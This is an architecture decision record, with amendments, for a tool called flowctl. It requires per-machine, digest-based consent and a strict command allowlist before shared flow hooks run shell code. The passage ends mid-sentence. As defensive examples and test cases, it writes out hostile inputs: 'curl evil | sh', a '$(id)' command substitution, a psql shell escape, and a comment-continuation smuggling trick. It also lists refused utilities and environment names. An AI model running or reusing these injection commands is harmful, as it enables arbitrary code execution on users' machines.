---
type: ADR
id: "0021"
title: "Shell hooks run only with consent recorded on this machine"
status: accepted
date: 2026-10-23
---

> Status note: this ADR is `accepted` and implemented as written in the Decision. The amendments of 2026-10-29,
> 2026-11-01 and 2026-11-02 are not yet implemented (the owner accepted the text of 2026-11-01 on 2026-11-02 and the
> text of 2026-11-02 on 2026-11-03, with the locale change recorded in its header); all of them change it once
> implemented; sentences they replace are marked "(superseded by ...)" inline.

## Context

A flow's `setup` and `teardown` are shell commands run with the caller's environment (`run/hooks.ts`).
Flows are about to be shared: developers commit them, testers pull them from a shared repo and run them
on their own machines. An exploration request from the orchestrator can also carry hooks, which
`saveExploration` writes into the flow and runs again in the confirming replay; once exploration is
exposed through MCP, a prompt-injected agent could turn that into shell execution (issue #18).
Peer review of flow files is the first defence, but a reviewed-and-merged hook still runs on every
teammate's machine without any of them having looked at it.

## Decision

**flowctl runs a flow's hooks only when this machine has approved exactly those hooks.** Consent is the
sha256 of `setup` and `teardown` as written (superseded by Amendment 2026-11-01), stored outside any repo in
`$FLOWCTL_TRUST_FILE`, else `$XDG_CONFIG_HOME/flowctl/trusted-hooks.json`, else
`~/.config/flowctl/trusted-hooks.json` (mode 0600) (location superseded by Amendment 2026-10-29).
`flowctl trust <name...>` records it after the user has reviewed the hooks. A changed hook (one
character) needs consent again. Without consent the run ends `error: hooks_untrusted` before anything
runs, with the `flowctl trust <name>` command in the hint. CI and other non-interactive callers consent
explicitly with `replay --trust-hooks` or `FLOWCTL_TRUST_HOOKS=1`; core takes `trustHooks: true` on
`RunSession.open`, `replayFlow`, `replayMany`, `Exploration.start` and `saveExploration` (superseded by Amendment
2026-11-01: the flag, the variable and the option are removed). Hooks never see
the System 1 API key (`TYPESAFE_API_KEY` and `system1.apiKeyEnv` are removed from their environment).

## Options considered

- **Per-machine consent by content digest** (chosen): a pull request cannot bring its own consent; no
  prompt in the replay path; works the same in a terminal, an agent and CI.
- **A consent file committed next to the flows**: rejected; whoever changes the hook also changes the
  consent in the same pull request.
- **An interactive prompt before each hook**: rejected; replay has no prompts (agents and CI cannot
  answer), and people learn to press Enter.
- **Only named hooks defined in config**: deferred; it needs config in a trusted place, which flows
  repos do not have yet. Revisit with the MCP server.

## Consequences

- **Easier:** a teammate's machine runs only hooks its owner looked at; the guard-bash hook asks before
  an agent runs `flowctl trust` (or `--trust-hooks`, removed by Amendment 2026-11-01).
- **Harder:** every new or edited hook costs one `flowctl trust`; CI must pass the flag (superseded by Amendment 2026-11-01). Consent covers the
  hook text only (superseded by Amendment 2026-11-01 section 2): a trusted `setup: ./scripts/seed.sh` or `npm run seed` keeps running after a pull request
  changes `seed.sh` or `package.json`. `flowctl trust` prints the hooks and says so; reviewing the files a
  hook calls stays with code review. The test suite
  sets `FLOWCTL_TRUST_HOOKS=1` (fixture flows carry hooks) and the consent tests unset it (superseded by Amendment
  2026-11-01: the suite pre-consents its fixture hooks in a `test` store).
- **Revisit when:** the MCP server lets an agent supply hooks, config gains a trusted location for named
  hooks, or shared flows start calling repo scripts (then fold the contents of files a hook names under
  the flows root into the digest; done by Amendment 2026-11-01 section 2).


## Amendment 2026-10-29

Hook consent folds into the trust store ([ADR 0025](0025-trust-store.md) section 5): same file, same
permission checks, an in-repo path refused. `$FLOWCTL_TRUST_FILE` is never read once ADR 0025 is implemented,
and the old digests are **not imported**: every hook needs `flowctl trust hook <name>`, which shows the hook
text. The `flowctl trust <name>` form is removed. The sentence "`--trust-hooks`, `FLOWCTL_TRUST_HOOKS=1` and
`trustHooks: true` are honoured only for a store marked `ci`" was superseded by Amendment 2026-11-01 section 1.
ADR 0025 is `proposed` until the owner accepts it.

## Amendment 2026-11-01

Accepted by the owner on 2026-11-02, as written and including the recommended default of each decision it marks; tasks T0.18 and T0.19 are closed. Closes the
hook-consent findings of the security review of PR #73. The amendment stays unimplemented together with
[ADR 0025](0025-trust-store.md); the behaviour above stays in force until the code lands. **It replaces the
last sentence of the amendment of 2026-10-29** and the phrase "sha256 of `setup` and `teardown` as written"
in the Decision.

### 1. No blanket consent; consentability is decided by the store marker

`--trust-hooks`, `FLOWCTL_TRUST_HOOKS=1` and `trustHooks: true` are removed in every mode, including a `ci`
store (ADR 0025 section 5). A workflow file or a repository script can set a flag, so honouring one lets a
pull request add `setup: curl evil | sh` without editing the workflow. A hook runs only when the store holds
its digest for (project, flow), recorded by an owner-key-signed `flowctl trust hook <name>` (ADR 0025 section
3). In CI the runner's owner provisions the digests before the job; the job user cannot write them.

Failure mode: `error: hooks_untrusted` with exactly one **reason**: `no_entry`, `digest_mismatch`,
`hook_uncovered` or `hook_env_unsafe` (detail, for the last: `path_unsafe`, `env_name_refused` or
`snapshot_unavailable`). `hook_env_unsafe` is a reason of `hooks_untrusted`, not a separate error. The hint
never suggests a flag.

**What may be consented is decided by the marker of the store that holds the entry, never by whether the run is
interactive.** In a store marked `ci` an entry whose `uncovered` list is non-empty is ignored (reason
`hook_uncovered`). In any other store an entry with an `uncovered` list is honoured, because the interactive
owner saw the list when consenting; a later non-interactive run in that store uses it. The closure is
recomputed at each run in both cases. **A hook is non-consentable in every store** when a file it names cannot
be shown at the consent screen (over 256 KiB, not UTF-8 text, or containing a byte refused by Amendment 2026-11-02 section 1; ADR 0025 section 3, display rules). ADR 0025
section 2 (row `ci`) says the same in the same words.

**Exploration requests carrying hooks** (`saveExploration`, `Exploration.start`) are refused with
`hooks_untrusted` (`no_entry`) until the flow has been saved and `flowctl trust hook <name>` has been run, so a
hook supplied by an agent never runs before the owner has seen it.

*Alternatives considered:* refuse the flag and offer no CI path (CI cannot run hook flows); require a pinned
commit of the flows directory (the pin lives in an editable file, so it needs a store entry anyway). Chosen
because the runner's owner decides, outside the pull request, which bytes may run. The test suite no longer
sets `FLOWCTL_TRUST_HOOKS=1`: it pre-consents its fixture hooks in a separate `test` store (ADR 0025 section 1).

### 2. The hook closure: an allowlist, defined once here

The first draft of this amendment listed bad shell patterns (runners, inline-code flags, dynamic constructs).
That class is unbounded: `python -c`, `node -e`, `ruby -e`, `env npm`, `FOO=1 make`, `cd x && make`,
`bash -ec`, `sh seed.sh;`, `curl | sh` and the next one nobody listed. **The closure is therefore an
allowlist: a hook is covered only if every simple command in it, and in every file it runs, has a first word
on a short fixed list and arguments of an allowed shape. Anything else is `uncovered`.**

**What the digest is, and is not.** The digest proves that the hook text and the files the closure names have
not changed since the owner looked at them. **It is not a sandbox.** It says nothing about what a listed utility
does (`curl` can send a file anywhere, `rm` can delete what its operand names), and it binds no file the closure
does not name. Section 4 lists what remains.

**2.1 Tokenising.** `setup` and `teardown` are each split with the POSIX shell grammar, without executing or
expanding anything. **Every POSIX control and redirection operator is recognised:** `;`, `;;`, `&`, `&&`, `||`,
`|`, `(`, `)`, `<`, `>`, `>>`, `<<`, `<<-`, `<&`, `>&`, `>|`, `<>`, and newline, and the non-POSIX `&>` and `|&`,
each with an optional leading file-descriptor number (`2>`, `3<&`). An unquoted `#` at the start of a word begins
a comment that runs to the end of the line and acts as a separator *(exact rule, including backslash-newline, superseded by Amendment 2026-11-02 section 1)*. Single quotes, double quotes and backslash
follow POSIX. The result is a list of **simple commands**, each a sequence of words plus redirections. *(The accepted subset is fixed by Amendment 2026-11-02 section 1: `(`, `)`, `;;`, `&` are `syntax`.)* **An
operator not in the list above, a here-document (`<<`, `<<-`, `<<<`), a process substitution, an unterminated
quote and any syntax the tokeniser cannot place are `uncovered` (reason `syntax`).** Redirection operators other
than `<`, `>`, `>>` and `2>&1`/`>&2` are `uncovered` as well.

**2.2 The allowlist.** The first word of every simple command must be exactly one of:

- **(a) A builtin from this fixed list:** `:`, `true`, `false`, `exit`, `test`, `[`, `echo`, `printf`, `wait`
  (operand limits of `exit`, `wait` and `printf`: Amendment 2026-11-02 section 6).
  Nothing else is a builtin for this purpose: `cd`, `pushd`, `chdir`, `.`, `source`, `eval`, `exec`, `export`,
  `set`, `unset`, `alias`, `trap`, `command`, `env`, `read`, `umask`, `ulimit` and `type` are not on it, so
  they make the hook `uncovered` (reason `command_not_allowed`). The bash-only forms `printf -v`, `test -v`,
  `[ -v` and `-R` are `uncovered`.
- **(b) A named core utility from this fixed list, in an allowed shape only:** `cp`, `mv`, `rm`, `mkdir`,
  `touch`, `cat`, `sleep`, `psql`, `curl`. *Why these:* they are what seed and reset hooks need (a database
  command, an HTTP call, file setup, a pause), and none runs its operand as a program by default. `psql` and
  `curl` can read program-like input from a file or stdin, so 2.4 admits them only in the narrow shapes
  below. *Left off on purpose:* every language runtime (`python`, `node`, `ruby`, `perl`, `php`), `sh`, `bash`,
  `dash`, `zsh`, `env`, `xargs`, `find`, `awk`, `sed`, `tar`, `git`, `ssh`, `scp`, `rsync`, `make`, `npm`,
  `npx`, `yarn`, `pnpm`, `bun`, `docker`, `kubectl`, `aws`. The list is data in core and can only be extended
  by a code change reviewed under the red tier. **Owner decision:** the list above (recommended default); drop
  `curl` and `psql` if no flow needs them.
- **(c) A closure file:** a word containing `/`, naming a regular file that is a **shell script** and whose own
  simple commands pass this same test, recursively. **A shell script** has a first line that is, byte for byte,
  `#!/bin/sh` or `#!/bin/dash`, **or has no `#!` line at all**. Any other `#!` first line (`#!/bin/bash`,
  `#!/usr/bin/env sh`, `#!/bin/sh -e`), a UTF-8 BOM, or a CR before the first newline makes the file `uncovered`
  (reason `not_shell_script`). **The `.sh` file name is never a criterion.** Closure scripts are POSIX `sh`
  only. They are run by `/bin/sh` by absolute path: a script with `#!/bin/sh` is exec'd by the kernel through
  that interpreter, and a script with no `#!` line is run by `sh` itself after the kernel's `ENOEXEC`; in both
  cases the interpreter is `/bin/sh`, except that a `#!/bin/dash` script is run by `/bin/dash` (Amendment 2026-11-02 section 8). The caller must not use `sh file`, `bash file` or `. file`: those words
  are not on the list.

A utility word is looked up only in the hook's fixed `PATH` (2.9); a command word with no `/` that is not in (a)
or (b) is `uncovered`, whatever it is. A word with `/` must be (c); **a command word containing `/` that names
a file that does not exist is `uncovered` (reason `missing_file`).**

**2.3 Expansion and assignment.** *(The rule for `$`, backtick, glob characters, `{` and leading `~` in this paragraph is superseded by Amendment 2026-11-02 section 1, which gives the exact quote-state table; the assignment sentences stand.)* A word is `uncovered` (reason `expansion`) when, anywhere in the hook text or a
closure file, it contains an unquoted or double-quoted `$` or backtick, an unquoted glob character (`*`, `?`,
`[`, `{`), or a leading `~` (the lone words `[` and `]` of the `[` builtin are exempt). Single-quoted text is
literal. An assignment word (`NAME=value`) in command position, and any assignment or `export` that names `PATH`,
is `uncovered`. A redirection target must be a literal word (no expansion) and is judged by 2.4. This covers
`FOO=1 make`, `PATH=. ./x`, `$(...)` and `eval`.

**2.4 Files, operands and the shapes of `psql` and `curl`.** Let *cwd* be the directory defined in 2.5.

*Superseded by Amendment 2026-11-02: items 1 to 6 and 9 (sections 2 to 5), and the first and last sentences of item 8 (the absolute-path list; `--opt=value` is split at `=`). Items 7 and 10 and the `..` and `-`-prefixed sentences of item 8 stand.*

1. **Which words are judged as paths.** The path rules below apply only to: the operands of `cp`, `mv`, `rm`,
   `touch`, `mkdir`, `cat`, `test` and `[`; redirection targets; and the **values of flags** of `psql` and `curl`
   (below). The arguments of `echo`, `printf` and `sleep`, and the text after `psql -c`, are exempt.
2. **A judged path word** (contains `/`, or names an existing file relative to cwd) is resolved relative to cwd.
   It must resolve inside the flows root with **no symlink component** and be a regular file with **link count
   1**; otherwise the hook is `uncovered` (`symlink`, `outside_flows_root`, `missing_file`).
3. **A shell script may be an operand only of `cp`, `mv`, `rm`, `touch`, `cat`, `mkdir`, `test` and `[`.** A
   closure file named as an operand or redirection source of `psql` or `curl`, or of anything else, is
   `uncovered` (`not_shell_script`). **Any other regular file** named as a judged operand or a redirection source
   (a `.sql`, `.json`, `.py`) is also `uncovered` (`not_shell_script`): there is no data-file category for
   execution, because a data file read by `psql` can hold `\!` shell escapes. (Such a file is still hashed and
   shown at consent where the store allows the hook, section 2.8.)
4. **`psql` is covered only as** `psql -X [connection options] -c '<text>'` with **exactly one** `-c`.
   Connection options are `-h`, `-p`, `-U`, `-d`, `-w` (their values are words, not judged as paths, except a
   value that is a `postgres://` or `postgresql://` URI, which is accepted as a connection string). `-f`,
   `--file`, `-L`, a stdin redirect or a pipe into `psql`, a missing `-c`, a second `-c`, and **any backslash in
   any argument** (including the `-c` text) make the hook `uncovered` (reason `psql_input`).
5. **`curl` is covered only when `-q` is its first argument.** The flags `-K`, `--config`, `-T`,
   `--upload-file`, `-o`, `-O`, `-D`, `--dump-header`, `-c`, `--cookie-jar`, `--output-dir`, `--stderr` and
   `--trace*` are `uncovered` (reason `curl_input`) **unless the value is `/dev/null`, `/dev/stdout` or
   `/dev/stderr`**. Any value or operand that starts with `@` (a file reference such as `-d @file`) is
   `uncovered` (`curl_input`).
6. **URL operands.** A `curl` operand containing `://` is a URL word and is judged only against `^https?://`;
   otherwise the hook is `uncovered` (reason `url_scheme`). It is not judged as a path. (For `psql` see 4.)
7. **A directory operand** (an existing directory named by any judged word, or a `-r`, `-R`, `-a`,
   `--recursive` flag on `cp`, `mv`, `rm`) makes the hook `uncovered` (reason `limit_exceeded`).
8. **Absolute paths.** The only absolute paths a hook may name are `/dev/null`, `/dev/stdout` and `/dev/stderr`.
   A relative path may contain no `..` component. A `-`-prefixed word is a flag, not a path; `--opt=value` is
   split at `=` and the value judged under rule 1.
9. **Writes.** A write (a redirection target, the destination of `cp`/`mv`, an operand of `rm`/`touch`/`mkdir`)
   must not name a closure file: that is `uncovered` (`writes_closure_file`).
10. **Standard input of the hook is `/dev/null`.** No hook reads stdin; `/dev/stdin` is not an allowed path.

**2.5 cwd and root.** **A hook runs from the snapshot of 2.7, whose layout mirrors the flows root.** There is no
other cwd and no option to run in the config root. The closure resolves every path relative to that mirrored
root, so a hook that needs a file outside the flows root names a path the snapshot does not contain and is
`uncovered` (reason `outside_flows_root`). **Existing hooks that call `./scripts/...` relative to the config
root must move under the flows root**; this is a one-time rewrite, and the code task (T1.0) changes `run/hooks.ts`
from `cwd = config root` to the snapshot. The flows root comes from the **store's project entry** (ADR 0025
`roots`, purpose `flows`), never from repo config, and its **project-relative path** (or its registered name when
outside the project) is written into the digest. `cd`, `pushd` and `chdir` are `uncovered` (2.2), so the cwd
cannot move.

**2.6 Limits.** *(Counting rules superseded by Amendment 2026-11-02 section 7.)* Depth 5 (a script calling a script counts one), 50 files, 256 KiB per file, 1 MiB in total. A
word that names a directory, a file over the limit, a file count over 50 or a depth over 5 makes the hook
`uncovered` with reason `limit_exceeded`.

**2.7 Opening files, snapshot and run.** Every closure file is opened with every path component checked by
`lstat` (a symlink anywhere in the chain is refused) and the final component opened `O_NOFOLLOW`, then
`fstat`: regular file, link count 1, device and inode equal to the `lstat`. The verified bytes are copied **from
the open descriptors** into a **fresh directory** made with `mkdtemp` under `/tmp` (the fixed path, not
`$TMPDIR`), mode 0700, owned by the current uid, outside any repository, mirroring the flows-root layout of the
closure files only (mode 0500). *(Directory modes and the re-hash before each hook: Amendment 2026-11-02 section 2.)* Setup and teardown of one run share one snapshot, deleted when the run ends, so
files a hook creates survive from setup to teardown; the snapshot is removed with descriptor-relative
`unlinkat` (no path walk that a symlink could redirect), and **the hook's process group is killed when the
hook ends**, so a background process cannot outlive the snapshot. A file the hook names that is not in the
closure does not exist in the snapshot, which is the same fact as `uncovered`.

**The snapshot closes swaps by other uids only.** A process with the owner's uid can still write into the 0700
directory. What it removes is the window between the check and the exec for a writer that does not run as the
owner (another account, or a process under the repository's checkout permissions). **If the snapshot cannot be
created, or `/tmp` is mounted `noexec`, the hook ends `hooks_untrusted` with reason `hook_env_unsafe` (detail
`snapshot_unavailable`); a hook never runs unsnapshotted.** There is no fallback and no named exception. This
replaces the earlier "named residual CI risk for a missing snapshot"; the residual that remains is the same-user
one in section 4 and ADR 0025 section 6.

**2.8 The digest.** Consent is the sha256 of this canonical JSON (keys sorted, no whitespace, UTF-8):

```
{"v":1,"purpose":"hook","interpreter":"/bin/sh -c","flowsRoot":"<project-relative path or registered name>",
 "cwd":".","setup":"...","teardown":"...","env":["NAME",...],"pins":{...},"pgpass":null,
 "files":[{"path":"<posix, relative to flowsRoot>","sha256":"...","kind":"script"|"data"},...]}
```

*(`pins` and `pgpass` are added by Amendment 2026-11-02 sections 9 and 10; both are part of the digest.)* **Every regular file the hook text or a closure script names, covered or not, is hashed into `files`** with
`kind` `script` (a shell script of 2.2 c) or `data` (anything else), sorted bytewise by path. A data file does
not make a hook covered; it makes the file's bytes part of what the owner consented to. `trust hook` **shows
every such file in full**; a file that cannot be shown (over 256 KiB, a byte refused by Amendment 2026-11-02 section 1, or not UTF-8 text) makes the hook
non-consentable in every store (section 1). For a command outside the allowlist (an `uncovered` entry) the
consent screen states in words that **files such a command reads are not bound by the digest**, and the entry
records `unbound: true`. `env` is the sorted list of names the owner added (2.9); `interpreter` is the string
`/bin/sh -c`, the one the code runs (`run/hooks.ts` spawns `sh -c` today; the code task spawns `/bin/sh` by
absolute path). A change to any of these is `digest_mismatch`. The `uncovered` list (reason plus the word or
path, never file content) is recorded beside the digest and is not part of it; the closure is recomputed at
each run and a different list is `digest_mismatch`. The digest is recomputed immediately before each hook
starts.

**`flowctl trust hook <name>`** prints the hook text, every file above in full, the final env names, the
interpreter, the cwd and the `uncovered` list. The digest for **hook consent** shares with the **confirmation
digest** of [ADR 0024](0024-target-scope-and-guards.md) section 5 only the closure function and the
file-hashing function; the two have different `purpose` values, so one can never stand in for the other. A
third digest, the **classification digest** of the store's `handWritten` section (ADR 0020 section b), is the
sha256 of `{"v":1,"purpose":"classify","flow":"<sha256 of the flow file>","hooks":{"setup":<closure>,
"teardown":<closure>}}` and likewise shares only the closure and file-hashing functions; "closure digest" in
ADRs 0020 and 0025 means this one. For hook consent, a hook with `uncovered` entries may be consented **only in a
store that is not marked `ci`**. For destructive confirmation an `uncovered` hook is refused (ADR 0024 section 5).

**2.9 The environment.** The child environment is built, not filtered:

- `PATH` is built from a **store-side fixed list** of system directories (default `/usr/bin`, `/bin`,
  `/usr/sbin`, `/sbin`; extended only by an owner-signed store entry). Each entry must be absolute, resolve
  outside every repository and worktree, be owned by root or the current user, and be writable by no one
  else; any failing entry ends the hook `hook_env_unsafe` (`path_unsafe`). The parent's `PATH` is never read.
- `TMPDIR` is the `tmp` directory inside the snapshot (2.7), mode 0700, under the same checks. The parent's
  `TMPDIR` is never read.
- **`HOME` is `<snapshot>/home`: an empty directory, mode 0700.** The one exception is an entry that names a
  `.pgpass`-style file explicitly (a closure `data` file, shown at consent): it is copied to
  `<snapshot>/home/.pgpass`, mode 0600 (field shape: Amendment 2026-11-02 section 9). `USER` and `LOGNAME` come from the passwd entry.
- `LANG` and `LC_*` are passed only if the value matches `^[A-Za-z_.@-]+$`; `TZ` only if it matches
  `^[A-Za-z0-9_/+:.-]+$`; `TERM` only if it matches `^[A-Za-z0-9_.-]+$`. A non-matching value is dropped.
- The names listed in the consent entry's `env` (chosen by the owner at `trust hook`, empty by default, shown on
  the consent screen). **Consent covers names, not values** *(superseded for the names of Amendment 2026-11-02 section 10, whose values are pinned)*. Because 2.3 bans expansion, these names matter
  to the listed utilities (`PGPASSWORD`, `PGHOST` for `psql`).
- **Refused at `trust hook` even if typed** *(matching is case-insensitive and the list is extended by Amendment 2026-11-02 sections 9 and 10)* (`hook_env_unsafe`, `env_name_refused`), and never passed: the
  System 1 key and every name the store allows as `system1.apiKeyEnv`; names matching `PYTHON*`, `PERL5OPT`,
  `PERL5LIB`, `RUBYOPT`, `RUBYLIB`, `NODE_PATH`, `NODE_*`, `GIT_*`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`,
  `CLASSPATH`, `GCONV_PATH`, `LOCPATH`, `NLSPATH`, `PROMPT_COMMAND`, `BASH_FUNC_*`, `CDPATH`, `*_PROXY`,
  `SSL_CERT_*`, `CURL_*`, `*_OPTIONS`, `*OPTS`, `LD_*`, `DYLD_*`, `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`,
  `PS4`, `IFS`, `PATH`, `TMPDIR`, `HOME`. *(Superseded by Amendment 2026-11-02 section 9: `env` is an allowlist, so no other name is passed, whatever the secret patterns say.)*

*Tests:* (1) each of `python3 -c 'x'`, `node -e x`, `env npm run x`, `FOO=1 make`, `cd x && make`, `bash -ec x`,
`sh seed.sh;`, `curl u | sh`, `./seed.sh $(id)`, `rm -r dir`, `psql -f seed.sql`, `psql -X -c 'x' < seed.sql`,
`psql -X -c '\!id'`, `curl https://x -K cfg`, `curl -d @f https://x`, `curl ftp://x`, `./nosuch.sh`, `echo a
&>f`, a script starting `#!/bin/bash`, a script with a BOM first line, and `printf -v x y` is
`uncovered`, with the reason named in this section; (2) `psql -X -h h -c 'select 1'` followed by `./seed.sh`,
where `seed.sh` has `#!/bin/sh` (or no `#!` line) and calls only `cp` and `curl -q https://x/y`, is covered,
and editing `seed.sh` after consent ends `hooks_untrusted` (`digest_mismatch`); (3) a symlinked or hard-linked
`seed.sh` is `uncovered`; (4) a flows root outside the project records its registered name in the digest; (5)
set `AWS_SECRET_ACCESS_KEY`, `TYPESAFE_API_KEY`, `PYTHONPATH` and `HOME=/x` in the parent and run a fixture
`psql` stand-in that prints its environment: it sees none of them and its `HOME` is `<snapshot>/home`; *(the clause listing `AWS_SECRET_ACCESS_KEY` in `env` so that it is seen is superseded by Amendment 2026-11-02 section 9: that name is refused)*; typing `PYTHONPATH` into `env` is refused at `trust
hook`; (6) a `PATH` entry inside the repository, or writable by group, ends `hooks_untrusted`
(`hook_env_unsafe`); (7) in a `ci` store a covered entry runs and an entry with an `uncovered` list is ignored;
in a non-`ci` store the same entry runs; (8) a hook that names a 300 KiB data file is non-consentable in a
non-`ci` store; (9) with `/tmp` mounted `noexec` (or unwritable) the hook does not run and the reason is
`hook_env_unsafe`; (10) a background process started by a hook is killed when the hook ends.

### 3. Owner decisions in this amendment

- The utility list (2.2 b): as written (recommended).

### 4. Residual risks, stated

- A process running as the same user can modify files the hook calls **before** the snapshot is made, can write
  into the snapshot while the hook runs, and can change what a listed utility does by changing the system
  directories it owns. **The snapshot closes swaps by other uids only** (2.7). The digest binds bytes the owner
  saw, not their behaviour.
- **In CI, PR code that ran earlier in the same job is a same-user adversary** and can plant files in places
  the job user owns; hook code itself is same-user code (ADR 0025 section 6). The snapshot and the fixed `PATH`
  narrow this and do not remove it.
- A covered hook can still do harm with a listed utility (`rm`, `curl` to any host). Reviewing the hook text and
  scripts remains the owner's job; the digest guarantees only that the text reviewed is the text that runs.
- The closure function is defined here once. [ADR 0024](0024-target-scope-and-guards.md) section 5 uses it for
  the hook part of the confirmation digest and adds only upload files; it keeps no word list or limits of its own.

## Amendment 2026-11-02

Accepted by the owner on 2026-11-03, including the recommended default of each decision it marks, with one change:
**hook locales are English and Vietnamese only** (section 9, `LANG` and `LC_*`). Closes tasks T0.27 and T0.28.

This amendment adds no new mechanism. It turns the vague rules of section 2 of the amendment of 2026-11-01 into
tables and grammars, and decides the env-value question that section 2.9 left open. Where it replaces a sentence
of that amendment, the sentence is marked "superseded by Amendment 2026-11-02". The digest and the consent rules
of section 1 of the amendment of 2026-11-01 are unchanged. Where a rule cannot be decided from the text, the
section says so and the answer is `uncovered`.

**Reason vocabulary.** A failing command gets exactly one reason: that of the first failing word in source order,
and within a word the first failing step of the order in section 2. `uncovered` reasons: `syntax`,
`command_not_allowed`, `expansion`, `not_shell_script`, `symlink`, `hardlink`, `outside_flows_root`,
`missing_file`, `writes_closure_file`, `limit_exceeded`, `cycle`, `flag_not_allowed`, `operand_shape`,
`psql_input`, `curl_input`, `url_scheme`, `url_glob`, `printf_format`, `interpreter_missing`. Reasons of
`hooks_untrusted` stay `no_entry`, `digest_mismatch`, `hook_uncovered`, `hook_env_unsafe`. **Details of
`hook_env_unsafe`** (they are not reasons): `path_unsafe`, `snapshot_unavailable`, `snapshot_modified`,
`env_name_refused`, `env_value_unpinned`, `env_value_invalid`, `env_value_mismatch`, `pgpass_shape`. A test
asserts one reason or one detail, never a list.

### 1. Quote states, expansion and comments (replaces the expansion sentence of 2.3 and the `#` sentence of 2.1)

**Input bytes.** `setup`, `teardown` and every closure file must contain no NUL, no byte below 0x20 other than LF
and TAB, and no 0x7f; a CR (so CRLF), a form feed and the like are refused. One such byte is `syntax`, and the
hook is non-consentable in every store (2.8). The check runs on the raw bytes before tokenising, because a shell
may drop a NUL while reading (`echo a\<NUL><newline>#x; curl ...` is one line in dash). A file without a trailing
newline is accepted; the end of the file ends its last line.

**Operators.** Accepted: `;`, `&&`, `||`, `|`, newline, and exactly these redirections: `<`, `>`, `>>`, each with
no prefix or the prefix `0`, `1` or `2`, and the duplications `2>&1`, `1>&2`, `>&2`. Everything else is `syntax`:
`(`, `)`, `;;`, `&`, `|&`, `&>`, `<<`, `<&`, `>|`, `<>`, a prefix other than 0 to 2 (`10>f`), and function
definitions such as `true() ( echo F )`. A redirection operator whose target is missing, including one followed by
a comment (`echo a >#x`, `echo a > #x`), is `syntax`.

**Line continuation.** A backslash directly followed by a newline is deleted before words are formed, in unquoted
text and inside double quotes. It is not deleted inside single quotes or inside a comment.

**Comments.** A comment starts only at an **unquoted `#` that is the very first character of a word in the raw
source text**, before quote removal and after line-continuation deletion. A comment ends at the **first newline
byte, whether or not a backslash precedes it**; that newline is a separator and the next line is parsed normally.
So `true # note \<newline>curl -q -K evil.cfg https://h/x` runs and judges the `curl` on line 2 (`curl_input`).
`#x` and `a #x` start comments. `''#x`, `""#x`, `a''#x`, `a#x` and `\#x` do not: they are ordinary words
(`''#x` is the literal word `#x`). Closure scripts follow the same rules.

**Quote states.** Every character of a word has one state: `U` unquoted; `S` inside single quotes; `D` inside
double quotes; `E` the character right after an unquoted backslash, or after a backslash inside double quotes when
that character is `$`, a backtick, `"` or `\` (inside double quotes a backslash before any other character is
literal and that character stays `D`). The quote characters and escaping backslashes are not characters of the
word. State belongs to the character, so `'a'*` has an unquoted `*` and `"*"x` has none.

| Character | `U` | `S` | `D` | `E` |
|---|---|---|---|---|
| `$` | `expansion` | literal | `expansion` | literal |
| backtick | `expansion` | literal | `expansion` | literal |
| `*`, `?` | `expansion` | literal | literal | literal |
| `[` | `expansion` (one exemption below) | literal | literal | literal |
| `{` | `expansion` | literal | literal | literal |
| `}`, `]`, `!`, `,`, `=`, `:` | literal | literal | literal | literal |
| `~` | `expansion` when first character of the word, or directly after an unquoted `=`, or directly after an unquoted `:`; literal elsewhere | literal | literal | literal |

- **Unquoted `{` is `expansion` wherever it stands**, also with no `}`, because brace expansion differs between
  bash and dash.
- **The `[` exemption** is the word whose entire text is an unquoted `[` in command position.
- **The first character of the word** is counted after quote removal, so `''~` has a leading `~` (fail closed).
  "Directly after" means the previous character of the word is an unquoted `=` or `:`.
- **Position does not matter** for `$`, backtick and glob characters: `--out=*.sql` is `expansion`. A character
  not in the table is literal. Redirection targets, the words of `[` and every closure file use the same table.

*Passing:* `'~'`, `"~"`, `\~`, `a~b`, `a/~`, `'*'`, `"*"`, `\*`, `"{a,b}"`, `'$HOME'`, `"\$HOME"`, `"a:~"`, `a}`,
`[ -f x ]`. *Failing (`expansion`):* `~`, `~/x`, `~root`, `--out=~/x`, `a:~`, `"$HOME"`, `` `id` ``, `*.sql`,
`a?`, `[a]`, `{a,b}`, `x{`, `'a'*`, `''~`, `"x\y$z"`.

### 2. Path words: decision order and classes (replaces 2.4 items 1, 2, 3 and 9, and the first and last sentences of item 8)

A **path word** is a word in a position of the table below. Words in other positions (arguments of `sleep`,
`exit`, `printf`, `echo`, the text after `psql -c`, header and data values of `curl`) are not paths. Of 2.4 item 8
two sentences survive: no `..` component (step 3) and a `-`-prefixed word is an option, not a path (step 2).

**Decision order.** The first failing step names the reason; later steps are not evaluated.

1. *Quote table* (section 1): `expansion`.
2. *Option or operand* (section 3): a word starting with `-` is an option while options are allowed. A
   `-`-prefixed word anywhere an operand is expected (after the first operand, after `--`, the word `-` itself) or
   an option not in the utility's table: `flag_not_allowed`. Operand count is checked last, once per command:
   `operand_shape`.
3. *Lexical*: empty, over 4096 bytes, a control character (below 0x20, 0x7f), not valid UTF-8, not in NFC, or
   ending in `/`: `operand_shape`. Absolute, or containing a `..` component: `outside_flows_root`. **The one
   exception** is the exact word `/dev/null` as a redirection source or target, as a `test` / `[` operand and as
   it ends the checks as passing. (`curl` sink values are not path words: section 5 judges them and a value other than `/dev/null` is `curl_input`.) As any other
   operand (`rm /dev/null`, `cat /dev/null`) it is absolute: `outside_flows_root`. **`/dev/stdout` and
   `/dev/stderr` are never allowed** (`: > /dev/stdout` truncates the runner's log): `outside_flows_root`. The
   fd duplications are those listed in section 1.
4. *Class checks* below.

**Normalisation.** Split on `/`, drop empty and `.` components; the result is the normalised path (`./a`, `a`,
`a//b` and `a/./b` give `a`, `a/b`). The `files` list of the digest uses the normalised path, POSIX separators,
no leading `./`. Comparison with closure files is bytewise on the normalised path, plus a second comparison on
its lower-cased form (Unicode simple lower-casing of the NFC string) for case-insensitive filesystems, plus
(device, inode) when the path exists. **This name comparison is only a first line. The protection that holds is
the 0500 modes plus the re-hash before each hook (below):** a write that reaches a closure file under another
spelling is caught as `snapshot_modified`.

**Closure file for writes** means every file in the closure of `setup` **together with** the closure of
`teardown`: all scripts reachable from either, and every file hashed under classes R and T. A write in `setup`
to a file `teardown` calls is therefore `writes_closure_file` (`printf x > ./td.sh` in `setup`, `./td.sh` in
`teardown`).

- **Class R (read).** Must name an existing regular file under the flows root; every component `lstat`ed: a
  symlink is `symlink`, link count above 1 is `hardlink`, a missing file is `missing_file`, outside the root is
  `outside_flows_root`, a directory is `limit_exceeded`. It is hashed into `files`. As before (2.4 item 3), a
